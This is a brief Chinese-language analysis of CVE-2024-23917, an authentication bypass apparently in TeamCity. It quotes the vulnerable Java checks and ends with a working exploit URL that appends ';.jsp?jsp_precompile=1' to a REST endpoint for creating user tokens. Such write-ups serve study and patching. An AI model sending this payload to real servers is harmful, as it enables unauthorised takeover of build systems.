# CVE-2024-23917

## analyze

和CVE-2023-42793相关，仍然是一个鉴权的绕过：

```java
    private boolean requestPreHandlingAllowed(@NotNull HttpServletRequest request) {
        if (WebUtil.isJspPrecompilationRequest(request)) {
            return false;
        } else {
            return !this.myPreHandlingDisabled.matches(WebUtil.getPathWithoutContext(request));
        }
    }
```

`CVE-2023-42793`利用的是`!this.myPreHandlingDisabled.matches(WebUtil.getPathWithoutContext(request));`，匹配上这个`this.myPreHandlingDisabled.matches`导致返回了false，绕过了鉴权。



CVE-2024-23917关注的则是`WebUtil.isJspPrecompilationRequest(request)`：

```java
    public static boolean isJspPrecompilationRequest(@NotNull HttpServletRequest request) {
        String uri = StringUtil.notNullize(request.getRequestURI());
        return (uri.endsWith(".jsp") || uri.endsWith(".jspf")) && request.getParameter("jsp_precompile") != null;
    }
```

非常容易绕过了。



## EXP

以`.jsp`结尾且有`jsp_precompile`就可以绕过。

```http
http://localhost:38111/app/rest/users/id:1/tokens/feng;.jsp?jsp_precompile=1
```



## References

https://t.zsxq.com/18ji6E2sZ